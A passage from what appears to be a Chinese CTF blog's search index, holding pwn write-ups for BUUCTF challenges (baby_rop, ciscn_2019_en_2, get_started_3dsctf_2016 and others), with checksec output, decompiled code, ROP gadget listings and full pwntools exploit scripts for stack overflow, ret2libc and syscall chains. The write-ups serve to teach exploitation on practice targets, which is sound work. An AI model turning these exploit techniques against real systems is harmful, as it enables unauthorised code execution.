值可以被我们栈溢出掉，于是我们可以用cyclic -l gaaa来看一看偏移量是多少：\npwndbg\u0026gt; cyclic -l gaaa 24 同时当前程序 plt 表中肯定有system（前面调用过），我们只需要/bin/sh或者sh就能构建 exp 了！\n构建 exp 在 ida 中找到system的地址：\nROPgadget寻找/bin/sh：\n$ ROPgadget --binary babyrop --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000601048 : /bin/sh ROPgadget寻找pop rdi;ret和ret：\n$ ROPgadget --binary babyrop --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400683 : pop rdi ; ret ... 0x0000000000400479 : ret ... 那么我们的 payload 就出来了：\npop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) 完整 exp from pwn import * from pwn import p64, p32, u32, u64 import pwnlib # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyrop\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28069\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x40060F\u0026#34;) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) pop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 p.recvuntil(\u0026#34;What\u0026#39;s your name? \u0026#34;) payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) p.sendline(payload) # p.recvuntil(\u0026#34;!\\n\u0026#34;) p.interactive() 此题还有一个比较坑的点，它的 flag 并不是放在当前目录下，此题 flag 的位置在/home/babyrop内，可以通过find -name flag查找位置（动作快一点，有时间限制）\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/harekazectf2019baby_rop/","section":"writeup","summary":"We respect our elders. There is wisdom that comes from experience, and I am not going to stop learning from wise counsel. — Marcia Fudge 原题链接 【Write-up】BUUCTF 【HarekazeCTF2019】baby_rop checksec 查看程序","tags":["pwn"],"title":"【HarekazeCTF2019】baby_rop"},{"categories":["writeup"],"contents":" Do you want to know who you are? Don\u0026rsquo;t ask. Act! Action will delineate and define you. — Thomas Jefferson\n原题链接和这道题是一道题，一模一样的\n【Write-up】BUUCTF ciscn_2019_en_2 checksec 查看程序架构 ida 查看程序伪代码 构建 exp 完整 exp checksec 查看程序架构 $ checksec --file ciscn_2019_en_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_en_2/ciscn_2019_en_2\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 位程序，不能用 shellcode\n再用readelf命令看一下：\n$ readelf -r ciscn_2019_en_2 重定位节 \u0026#39;.rela.dyn\u0026#39; at offset 0x538 contains 4 entries: 偏移量 信息 类型 符号值 符号名称 + 加数 000000601ff8 000800000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000602080 000d00000005 R_X86_64_COPY 0000000000602080 stdout@GLIBC_2.2.5 + 0 000000602090 000e00000005 R_X86_64_COPY 0000000000602090 stdin@GLIBC_2.2.5 + 0 0000006020a0 000f00000005 R_X86_64_COPY 00000000006020a0 stderr@GLIBC_2.2.5 + 0 重定位节 \u0026#39;.rela.plt\u0026#39; at offset 0x598 contains 11 entries: 偏移量 信息 类型 符号值 符号名称 + 加数 000000602018 000100000007 R_X86_64_JUMP_SLO 0000000000000000 _exit@GLIBC_2.2.5 + 0 000000602020 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 000000602028 000300000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0 000000602030 000400000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0 000000602038 000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000602040 000600000007 R_X86_64_JUMP_SLO 0000000000000000 getchar@GLIBC_2.2.5 + 0 000000602048 000700000007 R_X86_64_JUMP_SLO 0000000000000000 signal@GLIBC_2.2.5 + 0 000000602050 000900000007 R_X86_64_JUMP_SLO 0000000000000000 gets@GLIBC_2.2.5 + 0 000000602058 000a00000007 R_X86_64_JUMP_SLO 0000000000000000 fflush@GLIBC_2.2.5 + 0 000000602060 000b00000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0 000000602068 000c00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0 发现没有system，可能就是 ret2libc 了\nida 查看程序伪代码 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-4h] BYREF init(argc, argv, envp); puts(\u0026#34;EEEEEEE hh iii \u0026#34;); puts(\u0026#34;EE mm mm mmmm aa aa cccc hh nn nnn eee \u0026#34;); puts(\u0026#34;EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e \u0026#34;); puts(\u0026#34;EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;====================================================================\u0026#34;); puts(\u0026#34;Welcome to this Encryption machine\\n\u0026#34;); begin(); while ( 1 ) { while ( 1 ) { fflush(0LL); v4 = 0; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); getchar(); if ( v4 != 2 ) break; puts(\u0026#34;I think you can do it by yourself\u0026#34;); begin(); } if ( v4 == 3 ) { puts(\u0026#34;Bye!\u0026#34;); return 0; } if ( v4 != 1 ) break; encrypt(); begin(); } puts(\u0026#34;Something Wrong!\u0026#34;); return 0; } 这一大堆杂乱的代码我们花一点时间去分析就会发现，只有当第一次输入的选项是 1 的时候，才会进入encrypt函数，而这个函数的伪 C 代码为：\nint encrypt() { size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] BYREF __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(\u0026#34;Input your Plaintext to be encrypted\u0026#34;); gets(s); while ( 1 ) { v0 = (unsigned int)x; if ( v0 \u0026gt;= strlen(s) ) break; if ( s[x] \u0026lt;= 96 || s[x] \u0026gt; 122 ) { if ( s[x] \u0026lt;= 64 || s[x] \u0026gt; 90 ) { if ( s[x] \u0026gt; 47 \u0026amp;\u0026amp; s[x] \u0026lt;= 57 ) s[x] ^= 0xCu; } else { s[x] ^= 0xDu; } } else { s[x] ^= 0xEu; } ++x; } puts(\u0026#34;Ciphertext\u0026#34;); return puts(s); } 这代码也是乱得不得了，和神经病发癫一样。但是其实那一大串while里面的代码都可以通过这一句来跳过去：\nv0 = (unsigned int)x; // v0 \u0026gt;= 0 if ( v0 \u0026gt;= strlen(s) ) break; 如果我们让s的第一个字符为\\0的话，那么它strlen后的值就始终为 0，v0始终大于等于s的长度，那么就能直接跳出循环，不用进行下面那一大串操作。\n我们又看到输入函数为gets，这说明可以栈溢出，同时程序又有puts函数，我们就能得到libc的基址，从而计算出system的真实地址\n构建 exp 先把ret和pop rdi;ret这两个 gadget 准备好：\n$ ROPgadget --binary ciscn_2019_en_2 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400c83 : pop rdi ; ret ... 0x00000000004006b9 : ret ... 也可以通过 pwntools 的内置函数得到：\nrop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] puts 的 plt 和 got 地址、main 的地址同理：\nputs_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] 然后我们可以构建第一个 payload 了：\n# offset:int = 0x58，可以由gdb或者ida得知 payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) 然后我们就能得到puts的真实地址了：\np.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) # 这里很奇怪，调试后发现多了一个0a，要把它吞掉 p.recv(1) # 得到真实地址 puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) 为了避免各种版本的 libc 影响，我们可以使用 LibcSearcher：\n# 计算得到基址和system地址 searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) # 手动选择第0号搜索到的libc # 如果你选择0号不行，也可以把这行注释掉，运行中再选择 searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) 原版 LibcSearcher 已经年久失修，而且基于本地 libc 库，几乎完全不可用，GitHub 上有很多新版 LibcSearcher，我选择了这个使用云端 libc 库的项目\n作者为了使用正确的 libc 甚至重新搭了一个 ubuntu18.04 的虚拟机环境，但是在几个小时的忙碌后发现 libc 版本还是不对，于是转而选择 LibcSearcher，不得不说，是真**的好用，感谢原作者和后续无私奉献的开发者！\n然后我们可以构建 payload 了：\npayload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr) 完整 exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_en_2\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;29058\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) # 查找gadget的内置函数 if not if_32: rop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] success(f\u0026#34;pop_rdi:{hex(pop_rdi)}\u0026#34;) success(f\u0026#34;ret:{hex(ret)}\u0026#34;) else: pop_rdi:int = 0 ret:int = 0 #需要自行设定offset offset:int = 0x58 # 需要改为需要的输入函数，默认为puts puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] success(f\u0026#34;puts_plt:{hex(puts_plt)}\u0026#34;) success(f\u0026#34;puts_got:{hex(puts_got)}\u0026#34;) success(f\u0026#34;main_addr:{hex(main_addr)}\u0026#34;) # 发送payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(puts_plt) + pg(main_addr) + pg(0) + pg(puts_got) p.sendline(payload) # 得到真实地址 puts_addr:int = u32(p.recv(4)) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.recv(1) # 得到真实地址 puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) # 计算得到基址和system地址 searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) success(f\u0026#34;puts_addr:{hex(puts_addr)}\u0026#34;) success(f\u0026#34;base_addr:{hex(base_addr)}\u0026#34;) success(f\u0026#34;system_addr:{hex(system_addr)}\u0026#34;) success(f\u0026#34;bin_sh_addr:{hex(bin_sh_addr)}\u0026#34;) # 发送payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(system_addr) + pg(0) + pg(bin_sh_addr) p.sendline(payload) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr) p.sendline(payload) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/libsearcherciscn_2019_en_2/","section":"writeup","summary":"Do you want to know who you are? Don\u0026rsquo;t ask. Act! Action will delineate and define you. — Thomas Jefferson 原题链接和这道题是一道题，一模一样的 【Write-up】BUUCTF ciscn_2019_en_2 checksec 查看程序架构 ida 查看程序伪代码 构建 exp 完整","tags":["pwn","LibSearcher"],"title":"【LibSearcher】ciscn_2019_en_2"},{"categories":["writeup"],"contents":" People ask me what I do in winter when there\u0026rsquo;s no baseball. I\u0026rsquo;ll tell you what I do. I stare out the window and wait for spring. — Rogers Hornsby\n原题链接\n\u0026quot;【Write-up】BUUCTF not_the_same_3dsctf_2016 checksec查看程序架构 ida查看程序伪代码 构建exp 完整exp checksec查看程序架构 $ checksec --file not_the_same_3dsctf_2016 [*] \u0026#39;/home/peterl/security/workspace/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32位程序带堆防护\n同时，如果我们使用 ldd命令，就会发现这个程序是一个静态链接程序\nida查看程序伪代码 我们发现主函数很简单就能栈溢出，那我们再找找有没有后门函数\n结果发现了get_secret函数：\n我们发现这个后门函数实在有点特殊，主要逻辑是打开目录下的flag.txt文件，然后读入开头的至多45个字符入fl4g变量，我们双击fl4g变量发现其地址为：\n构建exp 我们使用readelf -s命令查看一下程序的符号表：\n$ readelf -s not_the_same_3dsctf_2016 | grep fl4g 1506: 080eca2d 45 OBJECT GLOBAL DEFAULT 24 fl4g $ readelf -s not_the_same_3dsctf_2016 | grep printf ... 901: 0804f0a0 30 FUNC GLOBAL DEFAULT 5 printf ... 那么我们的基本思路就是，先栈溢出调用后门函数，然后调用输出函数printf输出fl4g\npayload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) 注意，这里一定要使用exit退出，这里的exit起了一个return语句的作用\n完整exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./not_the_same_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;28534\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x8048A00\u0026#34;) else: p = process(fn) m_elf = ELF(fn) backdoor = 0x80489a0 p.clean() # 这里不能直接recvuntil，因为printf不刷新缓冲区，pwntools这种用管道的工具无法接收到任何字符 # p.recvuntil(\u0026#34;b0r4 v3r s3 7u 4h o b1ch4o m3m0... \u0026#34;) payload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/printf%E4%B8%8D%E5%88%B7%E6%96%B0%E7%BC%93%E5%86%B2%E5%8C%BAnot_the_same_3dsctf_2016/","section":"writeup","summary":"People ask me what I do in winter when there\u0026rsquo;s no baseball. I\u0026rsquo;ll tell you what I do. I stare out the window and wait for spring. — Rogers Hornsby 原题链接 \u0026quot;【Write-up】BUUCTF not_the_same_3dsctf_2016 checksec查看程序架构 ida查","tags":["pwn","printf不刷新缓冲区","无回显"],"title":"【printf不刷新缓冲区】not_the_same_3dsctf_2016"},{"categories":["writeup"],"contents":" The most formidable weapon against errors of every kind is reason. — Thomas Paine\n原题链接\n直接给了shell，但是把输出流关了 这时候我们可以用shell重定向输出流到输入流：\nexec 1\u0026gt;\u0026amp;0 cat flag ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/shell%E9%87%8D%E5%AE%9A%E5%90%91buuctf-wustctf2020_closed/","section":"writeup","summary":"The most formidable weapon against errors of every kind is reason. — Thomas Paine 原题链接 直接给了shell，但是把输出流关了 这时候我们可以用shell重定向输出流到输入流： exec 1\u0026gt;\u0026amp;0 cat flag","tags":["pwn","shell重定向"],"title":"【shell重定向】BUUCTF wustctf2020_closed"},{"categories":["writeup"],"contents":" We are shaped by our thoughts; we become what we think. When the mind is pure, joy follows like a shadow that never leaves. — Buddha\n原题链接\n在做题前，我先为其建立了一个专门的工作目录： 【syscall】【Write-up】BUUCTF Get_started_3dsctf_2016 checksec 查看架构 ida 查看程序（伪）代码 main 函数 后门函数 构建 exp 通过后门函数构建 exp 完整 exp1 通过 syscall 构建 exp 没有现成\u0026quot;/bin/sh\u0026quot;：构建字符串 完整 exp2 一些悬而未决的小问题 作者试图不使用pop edx;pop ecx;pop ebx;ret只使用pop edx;ret 无法执行其他二进制文件 checksec 查看架构 看来是 32 位的程序。我们首先就要想到，32 位程序的参数传递方式和 64 位程序的是不一样的：\n32 位将参数从右到左先后压入栈中 64 位程序将参数分别用 RDI,RSI,RCX,RDX,R8,R9 作为第 1-6 个参数，用 RAX 保存返回值 所以，我们调用 system 函数的思路就不一样了。我们就不需要 pop rdi;ret 这个 gadget（在 32 位程序中也找不到），而是只需要注意用 ret 这个 gadget 保持栈返回时最后一位为 0 即可（system 特殊规定），可以参考这里\n但是如果程序很好心地为我们提供了后门函数，那上面的这些也不用考虑了\n同时，我们要注意 32 位程序由于参数保存在栈中，call 的同时还会将【下一条指令的偏移】压入栈中，因此我们要为【下一条指令的偏移】预留出位置\nida 查看程序（伪）代码 main 函数 看来是简单的栈溢出\n值得注意的是，这里有一个小坑，即 printf 和 puts 的区别。\nprintf 在调用完后并不会马上打印出字符串，而是等待刷新缓冲区的指令之后才显示字符串。在这里就体现为，到 gets 函数向用户请求输入时，还没有任何字符串显示。\n因此，可能有人会在写 exp 的时候，一直等待字符串输出，看一直没反应还以为自己 payload 写错了（\n具体的 printf 和 puts 的区别可以看这位大佬的博文，非常详细\n后门函数 然后我们就发现了程序好心为我们提供的后门函数（\n只要我们传入参数分别为 814536271 和 425138641，那么我们就能得到 flag 的内容\n构建 exp 通过后门函数构建 exp 步骤如下：\n首先我们要找到 offset 溢出到 return 的栈地址，这通过 ida 很容易发现\r然后我们就将后门函数地址和参数值填入栈中即可 # pg = p32 payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) 然后直接 sendline 就 🆗 啦\n完整 exp1 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25191\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn) payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) p.sendline(payload) p.interactive() 通过 syscall 构建 exp 我们通过 ida 可以得知，该程序 plt 表内没有 system 函数也没有 execve 函数，同时此题又是静态编译，就不能适用 ret2libc 的方法从 libc 中找到 system。\n但是我们可以通过程序中断时产生的系统调用来执行 execve 这个中断程序\n全部中断程序编号见此\n这里我们只需要找到 59 号中断程序，向它传参即可\n64 位编号是 59，也就是 0x3b\n32 位编号是 11，也就是 0xb。\n同时，因为我们的程序是 32 位的，我们需要将编号传给 eax 寄存器，剩余参数分别传入 ecx,edx,esi,edi,ebp 中\n然后，我们要找到这几个参数对应的值。execve 函数后两个参数可以不管设为 0，但是第一个参数应该是/bin/sh或者sh\n为了将这几个参数送入寄存器中，我们还需要一个 gadget，不仅可以完成任务，还可以通过ret指令接着读下一条指令\n我们用ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot; | grep eax找 gadget：\n比较遗憾的是，没有刚刚好的 gadget，但是有一条勉强可用：\n0x080b91e6 : pop eax ; ret 那我们继续找 ebx、ecx、edx：\n$ROPgadget --binary get_started_3dsctf_2016 --only \u0026#34;pop|ret\u0026#34; | grep ebx 0x0809e102 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809e0fa : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805bf3d : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e4c4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x0809a7dc : pop ebx ; pop edi ; ret 0x0806fc09 : pop ebx ; pop edx ; ret 0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret 0x080483b7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a25b6 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096b1e : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x080718b1 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0804ab66 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049a95 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x080509a5 : pop ebx ; pop esi ; pop edi ; ret 0x080498af : pop ebx ; pop esi ; pop edi ; ret 4 0x08049923 : pop ebx ; pop esi ; ret 0x080481ad : pop ebx ; ret 0x080d413c : pop ebx ; ret 0x6f9 0x08099f96 : pop ebx ; ret 8 0x0806fc31 : pop ecx ; pop ebx ; ret 0x08063adb : pop edi ; pop esi ; pop ebx ; ret 0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret 0x0809e0f9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0807b1b0 : pop es ; pop ebx ; ret 0x0806fc08 : pop esi ; pop ebx ; pop edx ; ret 0x0805d090 : pop esi ; pop ebx ; ret 0x0805b8a0 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0809efe2 : pop ss ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 其中，有一条一下子就能同时设置三个需要用的寄存器：\n0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret 那现在我们的栈从低到高就应该是 eax-\u0026gt;edx-\u0026gt;ecx-\u0026gt;ebx 然后我们需要找到int 0x80这个 32 位系统调用 system call 的中断指令（64 位就是 syscall）：0x0806d7e5 : int 0x80 然后我们需要找到填入 ebx 寄存器的/bin/sh。结果是没有/bin/sh PS.这里不能直接找sh字符串，因为 execve 函数第一个参数是 path，必须是绝对地址，而且必须是二进制文件（或者脚本文件，但是只会执行!#之后的那个解释器）。在 Linux 系统种的sh命令是软链接，并不是二进制文件\n具体可以查看这篇博客，这篇博客也很不错\n没有现成\u0026quot;/bin/sh\u0026quot;：构建字符串 这题是静态链接，没法 ret2libc。\n但是，我们可以找一处没有用到的地址，利用一些 gadget 将我们需要的值写进去，然后我们就得到了一个程序可以使用的\u0026quot;/bin/sh\u0026quot;字符串地址！\n首先我们需要一条指令，支持我们向内存中写入值，这样我们就可以 pop 栈中的值到寄存器，再将空闲内存的地址赋给另一个寄存器，这样就可以向空闲地址写入值了\n通过ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;mov|ret\u0026quot;命令然后我们找到了这个可用的 gadget：\n# dword表示双字，就是四个字节，刚好是32位寄存器的大小 0x080557ab : mov dword ptr [edx], eax ; ret 然后我们可以直接利用之前找到过的pop edx;pop ecx;pop ebx;ret将地址弹到 edx 中\n然后我们用 ida 找到一块闲置空间（一直滚到.data 段，最后有一小段重复的 db 0）\n然后我们就可以完成我们的 payload 了：\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) 完整 exp2 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; # libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if_debug: bool = False if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: shell = gdb.debug(fn, \u0026#34;b* 0x8048A40\u0026#34;) else: p = process(fn) pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) if if_debug: shell.sendline(payload) shell.interactive() else: p.sendline(payload) p.interactive() 一些悬而未决的小问题 作者试图不使用pop edx;pop ecx;pop ebx;ret只使用pop edx;ret 我们用 ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot;命令找到了pop edx的命令\n0x0806fc0a : pop edx ; ret 看起来似乎没有问题\n令人疑惑的是，这样子连栈都没法写入(在 pop eax 后就是连串的 popal)，可能是我找的这个 gadget 本身有点小问题\n但是我尝试了pop ecx;pop ebx;ret和mov [ecx+4], eax，程序完全正常运作，可以正常得到 shell\npayload 如下：\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 # 这里一定要-4，因为gadget加了4 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_ecx_ebx_ret) + \\ pg(spare_space-4)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) 无法执行其他二进制文件 作者一开始试图execve(\u0026quot;sh\u0026quot;, 0, 